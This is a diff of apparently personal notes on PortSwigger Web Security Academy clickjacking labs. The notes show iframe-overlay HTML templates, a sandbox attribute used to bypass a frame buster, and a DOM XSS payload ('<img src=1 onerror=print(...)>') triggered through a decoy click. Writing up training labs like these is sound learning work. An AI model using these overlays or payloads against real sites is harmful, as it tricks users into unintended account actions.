@@ -1,8 +1,7 @@
 # Clickjacking (UI redressing)
 https://portswigger.net/web-security/clickjacking
 
-
-basic clickjacking:
+**basic clickjacking format:**
 ```htm
 <html>
     <head>
@@ -33,13 +32,10 @@ basic clickjacking:
 </html>
 ```
 
-
-
-1. <!-- Lab: Basic clickjacking with CSRF token protection -->
+# ***1. Lab: Basic clickjacking with CSRF token protection***
 https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
 
 using the page at /my-account, targeting the delete account button (dont test delete your own account - it will break the lab)
-
 
 ```htm
 <html>
@@ -76,17 +72,11 @@ using the page at /my-account, targeting the delete account button (dont test de
         </iframe>
     </body>
 </html>
-
 ```
 
+# CLICK!
 
-
-# DUDE!
-
-
-
-
-2. <!-- Lab: Clickjacking with form input data prefilled from a URL parameter -->
+# ***2. Lab: Clickjacking with form input data prefilled from a URL parameter***
 https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
 
  To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed. 
@@ -95,9 +85,7 @@ login, and test change your own email address. send req to repeater
 
 use the same iframe as before - just with ?paramater in the adress to fill the email address for the victim
 
-
-
-
+```htm
 <html>
     <head>
         <style>
@@ -130,15 +118,10 @@ use the same iframe as before - just with ?paramater in the adress to fill the e
         </iframe>
     </body>
 </html>
+```
+# CLICK!
 
-
-
-# DUDE!
-
-
-
-
-3. <!-- Lab: Clickjacking with a frame buster script -->
+# ***3. Lab: Clickjacking with a frame buster script***
 https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
 
 
@@ -148,14 +131,14 @@ https://www.w3schools.com/tags/att_iframe_sandbox.asp
 
 hint: 
 frame breaker:
+```htm
 <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
-
+``
 HTML5 iframe sandbox - allow-forms or allow-scripts
 allow-top-navigation - omitted
 
-
 use the same html clickjacking site with snadbox attribute added to the iframe
-
+```htm
 <html>
     <head>
         <style>
@@ -188,42 +171,42 @@ use the same html clickjacking site with snadbox attribute added to the iframe
         </iframe>
     </body>
 </html>
+```
+# CLICK!
 
-
-# DUDE!
-
-
-4. <!-- Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS -->
+# ***4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS***
 https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
 
-to solve the lab: construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function. 
+to solve the lab: construct a clickjacking attack that fools the user into clicking the "**Click me**" button to call the **print()** function. 
 
-1 . lets look for Dom sinks (innerHTML, document.location, search, etc.). observe in page GET /feedback HTTP/1.1 a call for js script page GET /resources/js/submitFeedback.js HTTP/1.1. inside we find inerHTML function:
-
+1. lets look for Dom sinks (innerHTML, document.location, search, etc.). observe in page **GET /feedback HTTP/1.1** a call for js script page **GET /resources/js/submitFeedback.js HTTP/1.1**. inside we find inerHTML function:
+```js
     function displayFeedbackMessage(name) {
         return function() {
             var feedbackResult = document.getElementById("feedbackResult");
             if (this.status === 200) {
                 feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
                 feedbackForm.reset();
-
+```
 the innerhtml might make the name field vulnarble to DOM XSS!
 
-2 . lets breakout of context using img> tag (since Script> tag dont work in innerhtml) :
+2. lets breakout of context using **img>** tag (since **Script>** tags dont work in innerhtml) :
+```htm
     feedbackResult.innerHTML = "Thank you for submitting feedback" + (
     "dude")<<img src=1 onerror=print(document.domain)><!--
     name ? ", " + name : "") + "!";
             feedbackForm.reset();
-
+```
 final payload to be inserted into the name field
+```htm
 "dude")<<img src=1 onerror=print(document.domain)><!--
+```
+**test payload in browser and get a POP!**
 
-test payload in browser and get a POP!
-
-3 . copy working payload (without csrf token) from POST /feedback/submit HTTP/1.1 and send POST /feedback HTTP/1.1 to repeater. paste payload Parameters and change request method to GE. copy url and insert to iframe at exploit server.
+3. copy working payload (without csrf token) from **POST /feedback/submit HTTP/1.1** and send **POST /feedback HTTP/1.1** to repeater. paste payload Parameters and change request method to **GE**. copy url and insert to iframe at exploit server.
 
 crafted exploit html:
-
+```htm
 <html>
     <head>
         <style>
@@ -254,17 +237,15 @@ crafted exploit html:
         </iframe>
     </body>
 </html>
+```
 
+# CLICK!
 
-# DUDE!
-
-
-
-
-5. <!-- Lab: Multistep clickjacking -->
+# ***5. Lab: Multistep clickjacking***
 https://portswigger.net/web-security/clickjacking/lab-multistep
 
 lets take the format from the 2nd lab for 1st stage:
+```htm
 <html>
     <head>
         <style>
@@ -307,12 +288,11 @@ lets take the format from the 2nd lab for 1st stage:
         </iframe>
     </body>
 </html>
+```
+# CLICK!
 
-
-# DUDE!
-
-portswigger solution:
-
+**portswigger solution:**
+```htm
 <style>
 	iframe {
 		position:relative;
@@ -335,5 +315,5 @@ portswigger solution:
 <div class="firstClick">Test me first</div>
 <div class="secondClick">Test me next</div>
 <iframe src="$url"></iframe>
-
-
+```
+# CLICK!
